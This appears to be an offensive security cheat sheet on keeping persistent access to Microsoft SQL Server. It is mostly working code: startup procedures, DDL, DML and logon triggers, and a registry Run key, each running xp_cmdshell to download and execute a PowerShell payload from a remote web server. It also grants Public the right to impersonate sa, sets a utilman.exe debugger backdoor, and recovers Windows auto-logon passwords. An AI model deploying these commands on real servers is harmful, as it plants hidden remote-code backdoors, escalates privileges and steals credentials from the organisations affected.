# Startup stored procedures

* sysadmin privileges are required to mark proc for automated execution
* owned only by sa
* must be in the master database
* cannot have input or output parameters
* gets executed with sysadmin privileges
* executed when SQL Server restart

> https://technet.microsoft.com/en-us/library/ms191129(v=sql.105).aspx

Create:
```
USE master
GO

CREATE PROCEDURE sp_autops
AS
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'')"'
GO
```

```
EXEC sp_procoption @ProcName = 'sp_autops', @OptionName = 'startup', @OptionValue = 'on';
```

List:
```
SELECT [name] FROM sysobjects WHERE type = 'P' AND OBJECTPROPERTY(id, 'ExecIsStartUp') = 1;
```

> https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql
> https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/

# Triggers

> https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql

## Data Definition Language (DDL) Triggers

* Execute under the context of the user that calls the trigger

```
CREATE Trigger [persistence_ddl_1]
ON ALL Server -- or DATABASE
FOR DDL_LOGIN_EVENTS -- See the docs below for events and event groups
AS
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'')"
'
GO
```

> https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/
> https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers
> https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups

## Data Manipulation Language (DML) Triggers

* Execute under the context of the user that calls the trigger
* User should have privilages to do the task in the trigger


```
USE master
GRANT IMPERSONATE ON LOGIN::sa to [Public];
USE testdb
CREATE TRIGGER [persistence_dml_1]
ON testdb.dbo.datatable
FOR INSERT, UPDATE, DELETE AS
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'')"'
GO
```

> https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/
> https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers

## Logon Triggers

* Ideal for triggering with a logon failure of a low-privilege user.

```
CREATE Trigger [persistence_logon_1]
ON ALL SERVER WITH EXECUTE AS 'sa'
FOR LOGON
AS
BEGIN
IF ORIGINAL_LOGIN() = 'testuser'
EXEC master..xp_cmdshell 'powershell -C "iex (new-object
System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'')"
'
END;
```

List all Triggers
```
SELECT * FROM sys.server_triggers
```

```
Get-SQLTriggerDdl -Instance instance -username sa -Password pw -Verbose
```

> https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers

# Registry keys

## `xp_regwrite`

* Needs sysadmin

```
EXEC xp_regwrite
@rootkey = 'HKEY_LOCAL_MACHINE',
@key = 'Software\Microsoft\Windows\CurrentVersion\Run',
@value_name = 'SQLServerUpdate',
@type = 'REG_SZ',
@value = 'powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString("http://webserver/evil.ps1")'
```

```
Get-SQLPersistRegDebugger -Instance instance -username sa -Password pw -FileName utilman.exe -Command 'c:\windows\system32\cmd.exe' -Verbose
```

```
Get-SQLPersistRegRun -Instance instance -username sa -Password pw -Name SQLUpdate -Command 'powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString("http://webserver/evil.ps1")' -Verbose
```

##`xp_regread`

* Limited read for public role

```
DECLARE @Reg_Value VARCHAR(1000)
EXECUTE xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\CurrentVersion',‘ProductName',
@Reg_Value OUTPUT
SELECT @Reg_Value
```

Read auto-login password:
```
Get-SQLRecoverPwAutoLogon -Instance instance -username sa -Password pw -Verbose
```

> https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/
##`xp_regdeletekey` - Needs sysadmin

> https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-is-denied-error-message-when-a-query-cal
